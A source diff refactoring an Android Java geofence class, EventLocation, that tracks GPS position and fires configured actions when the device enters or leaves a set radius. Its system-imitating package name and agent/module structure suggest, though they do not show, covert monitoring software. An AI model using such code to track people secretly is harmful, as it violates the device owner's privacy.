@@ -11,14 +11,18 @@ package com.android.service.event;
 
 import java.io.IOException;
 
-import com.android.service.agent.position.GPSLocator;
-import com.android.service.agent.position.GPSLocatorDistance;
-import com.android.service.agent.position.RangeObserver;
+import android.R.bool;
+
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfEvent;
+import com.android.service.conf.ConfigurationException;
+import com.android.service.module.position.GPSLocator;
+import com.android.service.module.position.GPSLocatorDistance;
+import com.android.service.module.position.RangeObserver;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 
-public class EventLocation extends EventBase implements RangeObserver {
+public class EventLocation extends BaseEvent implements RangeObserver {
 
 	private static final String TAG = "EventLocation"; //$NON-NLS-1$
 	int actionOnEnter;
@@ -30,43 +34,41 @@ public class EventLocation extends EventBase implements RangeObserver {
 	GPSLocator locator;
 
 	@Override
-	public void begin() {
+	public void actualStart() {
 		locator = new GPSLocatorDistance(this, latitudeOrig, longitudeOrig, distance);
 		locator.start();
 	}
 
 	@Override
-	public void end() {
+	public void actualStop() {
 		locator.halt();
+		
 		try {
 			locator.join();
 		} catch (final InterruptedException e) {
 
 			if (Cfg.DEBUG) {
-				Check.log(e) ;//$NON-NLS-1$
+				Check.log(e);//$NON-NLS-1$
 			}
 		}
+		
 		locator = null;
+		
+		onExit(); // di sicurezza
 	}
 
 	@Override
-	public boolean parse(EventConf eventConf) {
-		final byte[] confParams = eventConf.getParams();
-		final DataBuffer databuffer = new DataBuffer(confParams, 0, confParams.length);
-
+	public boolean parse(ConfEvent conf) {
 		try {
-			actionOnEnter = eventConf.getAction();
-			actionOnExit = databuffer.readInt();
+			distance = conf.getInt("distance");
 
-			distance = databuffer.readInt();
-
-			latitudeOrig = (float) databuffer.readDouble();
-			longitudeOrig = (float) databuffer.readDouble();
+			latitudeOrig = (float) conf.getDouble("latitude");
+			longitudeOrig = (float) conf.getDouble("longitude");
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Lat: " + latitudeOrig + " Lon: " + longitudeOrig + " Dist: " + distance) ;//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+				Check.log(TAG + " Lat: " + latitudeOrig + " Lon: " + longitudeOrig + " Dist: " + distance);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 			}
-		} catch (final IOException ex) {
+		} catch (final ConfigurationException ex) {
 			return false;
 		}
 
@@ -74,17 +76,19 @@ public class EventLocation extends EventBase implements RangeObserver {
 	}
 
 	@Override
-	public void go() {
+	public void actualGo() {
 	}
 
 	public int notification(Boolean onEnter) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + "  " + (onEnter?"Entered":"Exited"));
+		}
 		if (onEnter) {
-			trigger(actionOnEnter);
+			onEnter();
 		} else {
-			trigger(actionOnExit);
+			onExit();
 		}
 
 		return 0;
 	}
-
 }
